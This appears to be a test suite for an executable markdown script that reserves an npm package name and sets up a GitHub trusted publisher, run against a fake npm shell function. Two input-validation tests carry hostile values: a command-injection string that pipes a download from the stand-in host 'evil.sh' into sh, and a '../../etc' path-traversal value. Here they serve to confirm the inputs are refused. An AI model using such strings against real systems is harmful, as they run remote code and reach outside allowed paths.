/**
 * `scripts/bootstrap-npm-package.md` — the whole document, driven through
 * `execute()`.
 *
 * The document's job is not to publish; it is to refuse to publish. Every case
 * therefore asserts the completion `Result` and *both* sides of the ordering —
 * what ran before a refusal, and what provably did not run after it.
 *
 * Substitution happens only at contextual Api boundaries: `Env.cwd` for the
 * workspace the document reads, `Elicitation` for the question, `API.Process`
 * for the code blocks. The document's own shell runs for real under bash, and
 * its manifests, artifact, comparisons and branching are the real components
 * and eval blocks. Only `npm` is replaced, by a shell function on `BASH_ENV`.
 * Nothing here contacts a registry.
 */

import { describe, it } from "@executablemd/test-support/bdd";
import { expect } from "@executablemd/test-support/expect";
import { ensure, resource, scoped, until } from "effection";
import type { Operation } from "effection";
import { forEach } from "@effectionx/stream-helpers";
import { ensureDir, exists, readTextFile, rm, writeTextFile } from "@effectionx/fs";
import { mkdtemp, realpath } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { InMemoryStream } from "@executablemd/durable-streams";
import { API, useHostFiles } from "@executablemd/runtime";
import { Elicitation, execute, useTempFileCompiler } from "@executablemd/core";
import type { ElicitationRequest } from "@executablemd/core";

const DOCUMENT = fileURLToPath(new URL("../bootstrap-npm-package.md", import.meta.url));

const BOOTSTRAP_VERSION = "0.0.0-bootstrap.0";
const CODE = "123456";
const USER = "taras";

/**
 * What `npm trust list --json` prints for the configuration this document
 * installs.
 *
 * The shape is npm 11.17's: `TrustList` renders each configuration through
 * `TrustGitHub.bodyToOptions` (`id`, `type`, `file`, `repository`,
 * `environment`) and `logOptions` appends `permissions`, whose value for
 * `--allow-publish` is `createPackage`.
 */
const EXPECTED_TRUST = `${JSON.stringify(
  {
    id: "a2479f35-0000-4000-8000-000000000000",
    type: "github",
    file: "publish-packages.yml",
    repository: "taras/executable.md",
    environment: "npm-publish",
    permissions: ["createPackage"],
  },
  null,
  2,
)}\n`;

/** Trusted publishers this document did not configure, and must not replace. */
const FOREIGN_TRUST: Record<string, string> = {
  "a different repository": EXPECTED_TRUST.replace("taras/executable.md", "someone/else"),
  "a different workflow file": EXPECTED_TRUST.replace("publish-packages.yml", "release.yml"),
  "a wider permission set": EXPECTED_TRUST.replace(
    `"createPackage"`,
    `"createPackage",\n    "createStagedPackage"`,
  ),
};

/** What the fake registry answers about the package's current state. */
type RegistryState = "missing" | "bootstrap" | "unexpected" | "foreign-tag";

/**
 * The npm the document actually calls.
 *
 * It records more than its arguments: `PWD` and a listing of it are what make
 * the shared-artifact assertions observations rather than inferences, and
 * `npm_config_otp` is read as a shell variable because a `VAR=x fn` prefix on a
 * function is visible inside it without being exported.
 *
 * Registry and trust answers come from files rather than variables so the
 * elicitation provider can change them mid-run — which is the only way to reach
 * the publish stage's rechecks independently of the preview. A successful
 * publish and a successful trust creation write their own effect back, so a
 * later call in the same run, and a re-run, see what happened. A package npm
 * does not carry has no trust configuration to report, and answers 404.
 */
const FAKE_NPM = `
npm() {
  printf '%s|PWD=%s|LS=%s|otp=%s\\n' "$*" "$PWD" "$(ls -A | tr '\\n' ',')" "\${npm_config_otp-}" >> "$NPM_LOG"
  case "$1" in
    --version) echo "$NPM_VERSION" ;;
    whoami)
      if [ "\${NPM_WHOAMI_FAILS-}" = "1" ]; then
        echo "npm error code E401" >&2
        echo "npm error 401 Unauthorized - GET https://registry.npmjs.org/-/whoami" >&2
        return 1
      fi
      echo "${USER}"
      ;;
    view)
      state="$(cat "$NPM_STATE_FILE")"
      if [ "$state" = "missing" ]; then
        echo "npm error code E404" >&2
        return 1
      fi
      case "$3" in
        versions)
          case "$state" in
            unexpected) echo '["1.0.0"]' ;;
            *) echo '["${BOOTSTRAP_VERSION}"]' ;;
          esac
          ;;
        dist-tags)
          case "$state" in
            foreign-tag) echo '{"latest":"${BOOTSTRAP_VERSION}"}' ;;
            *) echo '{"bootstrap":"${BOOTSTRAP_VERSION}"}' ;;
          esac
          ;;
      esac
      ;;
    pack)
      if [ "\${NPM_PACK_FAILS-}" = "1" ]; then
        echo '[{"files":[]}]'
        echo "npm error code EPACK" >&2
        return 1
      fi
      echo '[{"name":"@executablemd/fixture","version":"${BOOTSTRAP_VERSION}","size":412,"unpackedSize":412,"entryCount":2,"files":[{"path":"package.json","size":227},{"path":"README.md","size":185}]}]'
      ;;
    publish)
      echo 'npm notice publishing bootstrap artifact'
      if [ "\${NPM_PUBLISH_FAILS-}" = "1" ]; then return 1; fi
      printf 'bootstrap' > "$NPM_STATE_FILE"
      ;;
    trust)
      case "$2" in
        list)
          if [ "$(cat "$NPM_STATE_FILE")" = "missing" ]; then
            echo "npm error code E404" >&2
            return 1
          fi
          cat "$NPM_TRUST_FILE"
          ;;
        github)
          if [ "\${NPM_TRUST_FAILS-}" = "1" ]; then return 1; fi
          printf '%s' "$NPM_TRUST_EXPECTED" > "$NPM_TRUST_FILE"
          ;;
      esac
      ;;
  esac
}
`;

interface Fixture {
  /** Workspace the document resolves `{props.package}` against. */
  root: string;
  /** File the fake npm reads its registry answer from. */
  stateFile: string;
  /** File holding what `npm trust list` prints; empty means no configuration. */
  trustFile: string;
  /** File the fake npm appends one line per call to. */
  logFile: string;
  /** File holding the fake npm function, sourced through `BASH_ENV`. */
  envFile: string;
}

/**
 * A workspace the document can bootstrap: one member with the two manifests its
 * guards require, and one whose name is outside the scope.
 *
 * A `resource`, not a `scoped`: a scoped block would delete the directory before
 * handing back its path.
 */
function useFixture(): Operation<Fixture> {
  return resource(function* (provide) {
    const root = yield* until(realpath(yield* until(mkdtemp(join(tmpdir(), "bootstrap-npm-")))));
    yield* ensure(() => rm(root, { recursive: true, force: true }));

    for (const [directory, name] of [
      ["fixture", "@executablemd/fixture"],
      ["foreign", "foreign-pkg"],
    ]) {
      const member = join(root, "packages", directory);
      yield* ensureDir(member);
      yield* writeTextFile(join(member, "deno.json"), `${JSON.stringify({ name }, null, 2)}\n`);
      yield* writeTextFile(
        join(member, "package.json"),
        `${JSON.stringify({ name, description: "A fixture." }, null, 2)}\n`,
      );
    }

    const fixture: Fixture = {
      root,
      stateFile: join(root, "registry-state"),
      trustFile: join(root, "trust-state"),
      logFile: join(root, "npm.log"),
      envFile: join(root, "fake-npm.sh"),
    };
    yield* writeTextFile(fixture.envFile, FAKE_NPM);
    yield* writeTextFile(fixture.stateFile, "missing");
    yield* writeTextFile(fixture.trustFile, "");
    yield* provide(fixture);
  });
}

/** One recorded call to the fake npm. */
interface NpmCall {
  args: string;
  cwd: string;
  listing: string;
  otp: string;
}

function parseLog(contents: string): NpmCall[] {
  return contents
    .split("\n")
    .filter((line) => line.length > 0)
    .map((line) => {
      const [args = "", cwd = "", listing = "", otp = ""] = line.split("|");
      return {
        args,
        cwd: cwd.replace(/^PWD=/, ""),
        listing: listing.replace(/^LS=/, ""),
        otp: otp.replace(/^otp=/, ""),
      };
    });
}

interface RunOptions {
  /** Registry state to install before the run; omitted leaves it as it is. */
  state?: RegistryState;
  /** Trust-list output to install before the run; omitted leaves it as it is. */
  trust?: string;
  /** Registry state the provider installs while the operator is "answering". */
  stateAfterElicit?: RegistryState;
  /** Trust configuration the provider installs while the operator answers. */
  trustAfterElicit?: string;
  npmVersion?: string;
  whoamiFails?: boolean;
  packFails?: boolean;
  publishFails?: boolean;
  trustFails?: boolean;
  /** How the provider behaves: answer correctly, fail, or break its schema. */
  elicit?: "answer" | "throw" | "invalid";
  /** Overrides the `package` prop, for the input-validation cases. */
  packageProp?: string;
}

interface Run {
  ok: boolean;
  failure: string;
  /** Everything the document rendered, in the order the CLI would write it. */
  output: string;
  calls: NpmCall[];
  requests: ElicitationRequest[];
  /** Every command the Process Api was asked to run, interception included. */
  execCount: number;
}

function run(fixture: Fixture, options: RunOptions = {}): Operation<Run> {
  return scoped(function* () {
    if (options.state) {
      yield* writeTextFile(fixture.stateFile, options.state);
    }
    if (options.trust !== undefined) {
      yield* writeTextFile(fixture.trustFile, options.trust);
    }
    yield* writeTextFile(fixture.logFile, "");

    const requests: ElicitationRequest[] = [];
    const counter = { execs: 0 };

    // Installed on this scope, not inside a resource: middleware installs on the
    // scope that runs the install, so a provider installed in a resource body
    // would be invisible to the execution this function is about to start.
    yield* useTempFileCompiler();
    // `<File>` and `<TempDir>` speak `API.Files`, which has no host default.
    yield* useHostFiles();

    // The workspace the document reads `{props.package}` from. At `min` a
    // nested install answers first, so `<TempDir>` still rebinds the working
    // directory for its own content.
    yield* API.Env.around(
      {
        // deno-lint-ignore require-yield
        *cwd() {
          return fixture.root;
        },
      },
      { at: "min" },
    );

    yield* Elicitation.around(
      {
        *elicit([request]) {
          requests.push(request);
          if (options.stateAfterElicit) {
            yield* writeTextFile(fixture.stateFile, options.stateAfterElicit);
          }
          if (options.trustAfterElicit !== undefined) {
            yield* writeTextFile(fixture.trustFile, options.trustAfterElicit);
          }
          if (options.elicit === "throw") {
            throw new Error("provider could not reach anyone");
          }
          if (options.elicit === "invalid") {
            return { unexpected: true };
          }
          return { code: CODE };
        },
      },
      { at: "min" },
    );

    yield* API.Process.around({
      *exec([execOptions], next) {
        counter.execs++;
        return yield* next({
          ...execOptions,
          env: {
            ...process.env,
            BASH_ENV: fixture.envFile,
            NPM_LOG: fixture.logFile,
            NPM_STATE_FILE: fixture.stateFile,
            NPM_TRUST_FILE: fixture.trustFile,
            NPM_TRUST_EXPECTED: EXPECTED_TRUST,
            NPM_VERSION: options.npmVersion ?? "11.17.0",
            NPM_WHOAMI_FAILS: options.whoamiFails ? "1" : "",
            NPM_PACK_FAILS: options.packFails ? "1" : "",
            NPM_PUBLISH_FAILS: options.publishFails ? "1" : "",
            NPM_TRUST_FAILS: options.trustFails ? "1" : "",
          },
        });
      },
    });

    const chunks: string[] = [];
    let ok = false;
    let failure = "";
    try {
      const execution = yield* execute({
        path: DOCUMENT,
        stream: new InMemoryStream(),
        props: { package: options.packageProp ?? "packages/fixture" },
      });
      // The two steps cli.ts performs, in its order: drain the output stream
      // first, then read the completion Result. Every failure below arrives
      // through the Result rather than by throwing out of the stream.
      yield* forEach(function* (chunk: string) {
        chunks.push(chunk);
      }, execution.output);
      const result = yield* execution;
      ok = result.ok;
      failure = result.ok ? "" : String(result.error?.message ?? result.error);
    } catch (error) {
      failure = error instanceof Error ? error.message : String(error);
    }

    return {
      ok,
      failure,
      output: chunks.join(""),
      calls: parseLog(yield* readLog(fixture)),
      requests,
      execCount: counter.execs,
    };
  });
}

function* readLog(fixture: Fixture): Operation<string> {
  if (!(yield* exists(fixture.logFile))) {
    return "";
  }
  return yield* readTextFile(fixture.logFile);
}

/** Did npm get asked to do this? `args` is matched as a prefix of the call. */
function called(run: Run, args: string): boolean {
  return run.calls.some((call) => call.args.startsWith(args));
}

function callTo(run: Run, args: string): NpmCall | undefined {
  return run.calls.find((call) => call.args.startsWith(args));
}

/**
 * Nothing reached the registry and nothing was replaced. The mutation half of
 * every refusal, asserted as one thing so no case can forget a piece of it.
 */
function expectNoRegistryMutation(run: Run): void {
  expect(called(run, "publish")).toBe(false);
  expect(called(run, "trust github")).toBe(false);
  expect(called(run, "trust revoke")).toBe(false);
}

describe("bootstrap an npm package", () => {
  describe("verifying before it works", () => {
    it("renders the checklist from what npm reported", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing", trust: "" });

      expect(result.failure).toBe("");
      expect(result.output).toContain("# Bootstrapping packages/fixture");
      expect(result.output).toContain(`Logged in as ${USER}`);
      expect(result.output).toContain("npm 11.17.0");
      expect(result.output).toContain("package.json   @executablemd/fixture  ✓");
      expect(result.output).toContain("deno.json      @executablemd/fixture  ✓");
    });

    it("stops on a failed login, before it looks at the registry", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { whoamiFails: true });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      expect(called(result, "view")).toBe(false);
      expect(called(result, "pack")).toBe(false);
      expectNoRegistryMutation(result);
    });

    it("stops on an npm too old for `npm trust`", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { npmVersion: "11.14.0" });

      expect(result.ok).toBe(false);
      expect(result.failure).toContain("11.15");
      expect(result.requests.length).toBe(0);
      // An old npm that reserved a name and then failed at trust is the exact
      // half-configured state this ordering prevents.
      expect(called(result, "view")).toBe(false);
      expect(called(result, "pack")).toBe(false);
      expectNoRegistryMutation(result);
    });
  });

  describe("reserving a name and installing trust", () => {
    it("previews, asks once, publishes, and configures the expected trust", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing", trust: "" });

      expect(result.failure).toBe("");
      expect(result.ok).toBe(true);
      expect(result.output).toContain(
        "@executablemd/fixture is not on npm — it will be reserved at 0.0.0-bootstrap.0",
      );
      // The artifact preview: the manifest that becomes the record, and the
      // files npm reports it would pack.
      expect(result.output).toContain(`"name": "@executablemd/fixture"`);
      expect(result.output).toContain("package.json   227 B");
      expect(result.output).toContain("2 files, 412 B unpacked");
      // Each write says it happened, in the document's words.
      expect(result.output).toContain(
        "Reserved @executablemd/fixture@0.0.0-bootstrap.0 under the bootstrap dist-tag",
      );
      expect(result.output).toContain(
        "Trusted taras/executable.md via publish-packages.yml in npm-publish, publish only",
      );
      expect(result.requests.length).toBe(1);
      expect(called(result, "publish --access public --tag bootstrap")).toBe(true);
      expect(
        called(
          result,
          "trust github @executablemd/fixture --file publish-packages.yml" +
            " --repository taras/executable.md --environment npm-publish --allow-publish",
        ),
      ).toBe(true);

      // Preview before question before registry: the operator answers an
      // informed question, and nothing was written when they were asked.
      const packAt = result.calls.findIndex((call) => call.args.startsWith("pack"));
      const publishAt = result.calls.findIndex((call) => call.args.startsWith("publish"));
      const trustAt = result.calls.findIndex((call) => call.args.startsWith("trust github"));
      expect(packAt).toBeGreaterThanOrEqual(0);
      expect(publishAt).toBeGreaterThan(packAt);
      expect(trustAt).toBeGreaterThan(publishAt);
    });

    it("skips the publish for an existing reservation and installs the missing trust", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "bootstrap", trust: "" });

      expect(result.ok).toBe(true);
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
      expect(result.output).toContain(
        "@executablemd/fixture is already reserved at 0.0.0-bootstrap.0 — the publish will be skipped",
      );
    });

    it("asks for a code but builds no artifact when only the trust is missing", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "bootstrap", trust: "" });

      expect(result.ok).toBe(true);
      // There is something to write, so it asks.
      expect(result.requests.length).toBe(1);
      // But nothing to publish, so it previews no artifact that will not ship.
      expect(called(result, "pack")).toBe(false);
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
    });

    it("skips both halves when the reservation and the trust already match", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "bootstrap", trust: EXPECTED_TRUST });

      expect(result.failure).toBe("");
      expect(result.ok).toBe(true);
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github")).toBe(false);
      expect(result.output).toContain("Its trusted publisher already matches");
      // Nothing to write, so nothing is asked for and no artifact is built.
      expect(result.requests.length).toBe(0);
      expect(called(result, "pack")).toBe(false);
      // It still reads the registry back and reports the end state.
      expect(result.output).toContain("is the only published version");
    });
  });

  describe("refusing before anyone is asked", () => {
    it("refuses a package already published at another version", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "unexpected" });

      expect(result.ok).toBe(false);
      expect(result.output).toContain("is already a live package on npm");
      expect(result.requests.length).toBe(0);
      expect(called(result, "pack")).toBe(false);
      expectNoRegistryMutation(result);
    });

    it("refuses a reservation whose dist-tags are not the expected one", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "foreign-tag" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      expect(called(result, "pack")).toBe(false);
      expectNoRegistryMutation(result);
    });

    it("refuses a workspace path with no manifests", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packageProp: "packages/absent" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      expect(called(result, "view")).toBe(false);
      expectNoRegistryMutation(result);
    });

    it("refuses a member outside the @executablemd scope", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packageProp: "packages/foreign" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      expect(called(result, "view")).toBe(false);
      expectNoRegistryMutation(result);
    });

    it("refuses a package prop that would reach the shell", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        packageProp: "packages/fixture; curl evil.sh | sh",
      });

      expect(result.ok).toBe(false);
      // Refused by schema validation before the body ran at all — not cleaned
      // up inside the shell.
      expect(result.execCount).toBe(0);
      expect(result.requests.length).toBe(0);
    });

    it("refuses a package prop that escapes the workspace", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packageProp: "../../etc" });

      expect(result.ok).toBe(false);
      expect(result.execCount).toBe(0);
      expect(result.requests.length).toBe(0);
    });

    it("refuses a preview that prints before it fails, keeping what it printed", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packFails: true });

      expect(result.ok).toBe(false);
      // npm's own diagnostic reaches the failure, and everything rendered
      // before the preview is still on screen.
      expect(result.failure).toContain("EPACK");
      expect(result.output).toContain(`Logged in as ${USER}`);
      expect(result.requests.length).toBe(0);
      expectNoRegistryMutation(result);
    });

    for (const [description, foreign] of Object.entries(FOREIGN_TRUST)) {
      it(`refuses a trusted publisher with ${description}, and revokes nothing`, function* () {
        const fixture = yield* useFixture();
        const result = yield* run(fixture, { state: "bootstrap", trust: foreign });

        expect(result.ok).toBe(false);
        expect(result.output).toContain("already trusts a publisher this document did not set up");
        // Actionable rather than hand-wavy: the exact command to undo it.
        expect(result.output).toContain(
          "npm trust revoke @executablemd/fixture --id a2479f35-0000-4000-8000-000000000000",
        );
        expect(result.requests.length).toBe(0);
        expectNoRegistryMutation(result);
        // Whatever was there is still there.
        expect(yield* readTextFile(fixture.trustFile)).toBe(foreign);
      });
    }
  });

  describe("refusing after the question, before the registry", () => {
    it("stops when the provider cannot reach anyone", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { elicit: "throw" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      // The preview is on screen; nothing was written.
      expect(result.output).toContain("2 files, 412 B unpacked");
      expectNoRegistryMutation(result);
    });

    it("stops when the answer does not satisfy its schema", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { elicit: "invalid" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      expect(called(result, "pack")).toBe(true);
      expectNoRegistryMutation(result);
    });
  });

  describe("re-checking while the operator answers", () => {
    it("refuses a package that gained a foreign version", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        state: "missing",
        stateAfterElicit: "unexpected",
      });

      expect(result.ok).toBe(false);
      expect(result.output).toContain("changed while you were entering your code");
      expect(result.requests.length).toBe(1);
      // Publishing on the preview's answer would have published over whatever
      // arrived in the meantime.
      expectNoRegistryMutation(result);
    });

    it("refuses a package that gained a foreign dist-tag configuration", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        state: "missing",
        stateAfterElicit: "foreign-tag",
      });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      expectNoRegistryMutation(result);
    });

    it("refuses a package that gained a foreign trusted publisher", function* () {
      const fixture = yield* useFixture();
      const foreign = FOREIGN_TRUST["a different repository"];
      const result = yield* run(fixture, {
        state: "bootstrap",
        trust: "",
        trustAfterElicit: foreign,
      });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      // The reservation existed, so there was nothing to publish, and the
      // foreign configuration was left exactly as it was found.
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github")).toBe(false);
      expect(called(result, "trust revoke")).toBe(false);
      expect(yield* readTextFile(fixture.trustFile)).toBe(foreign);
    });

    it("adopts a reservation somebody else completed, without publishing again", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        state: "missing",
        trust: "",
        stateAfterElicit: "bootstrap",
      });

      expect(result.ok).toBe(true);
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
    });
  });

  describe("failing on the registry", () => {
    it("reports a publish that prints before it fails, and does not configure trust", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { publishFails: true });

      expect(result.ok).toBe(false);
      expect(called(result, "publish")).toBe(true);
      expect(called(result, "trust github")).toBe(false);
      expect(called(result, "trust revoke")).toBe(false);
    });

    it("leaves a failed trust configuration rerunnable", function* () {
      const fixture = yield* useFixture();
      const failed = yield* run(fixture, { state: "missing", trust: "", trustFails: true });

      expect(failed.ok).toBe(false);
      expect(called(failed, "publish")).toBe(true);
      expect(called(failed, "trust github @executablemd/fixture")).toBe(true);
      expect(yield* readTextFile(fixture.trustFile)).toBe("");

      // The reservation the failed run created is now the registry's state, and
      // re-running finishes the half that did not complete.
      const again = yield* run(fixture);

      expect(again.failure).toBe("");
      expect(again.ok).toBe(true);
      expect(called(again, "publish")).toBe(false);
      expect(called(again, "trust github @executablemd/fixture")).toBe(true);
      expect(yield* readTextFile(fixture.trustFile)).toBe(EXPECTED_TRUST);
    });
  });

  describe("what the document guarantees about its own shape", () => {
    it("carries one code to the two authenticated commands and nowhere else", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing", trust: "" });

      expect(callTo(result, "publish")?.otp).toBe(CODE);
      expect(callTo(result, "trust github")?.otp).toBe(CODE);
      const unauthenticated = result.calls.filter(
        (call) => !call.args.startsWith("publish") && !call.args.startsWith("trust github"),
      );
      expect(unauthenticated.length).toBeGreaterThan(0);
      expect(unauthenticated.every((call) => call.otp === "")).toBe(true);

      // Rendered output is what a command printed, never the command itself.
      expect(result.output).not.toContain(CODE);
      expect(result.requests.length).toBe(1);
    });

    it("publishes the artifact the preview built, from the directory it built it in", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing", trust: "" });

      const pack = callTo(result, "pack");
      const publish = callTo(result, "publish");
      expect(pack?.cwd).toBeDefined();
      expect(pack?.cwd).not.toBe(fixture.root);
      expect(publish?.cwd).toBe(pack?.cwd);
      // Written by `<File>` before the preview, still there when the publish
      // runs, and nothing else was added beside them.
      expect(publish?.listing).toContain("package.json");
      expect(publish?.listing).toContain("README.md");
    });

    it("releases the shared directory when the run ends", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing", trust: "" });

      const publish = callTo(result, "publish");
      expect(publish?.cwd).toBeDefined();
      expect(yield* exists(publish?.cwd ?? "")).toBe(false);
    });

    it("releases the shared directory when the run fails", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packFails: true });

      const pack = callTo(result, "pack");
      expect(pack?.cwd).toBeDefined();
      expect(yield* exists(pack?.cwd ?? "")).toBe(false);
    });

    it("resolves every component it uses, with no assertion machinery left", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing", trust: "" });

      expect(result.output).not.toContain("Cannot resolve component");
      expect(result.output).not.toContain("<!-- ERROR");

      // The gates are the region's error mode and `<If>`, so no assertion
      // component is registered by this suite and none is written in the
      // document. A reintroduced verdict file would make the run above pass
      // while proving something else.
      const source = yield* readTextFile(DOCUMENT);
      expect(source).not.toContain("AssertMatch");
      expect(source).not.toContain("verdict");
    });
  });
});
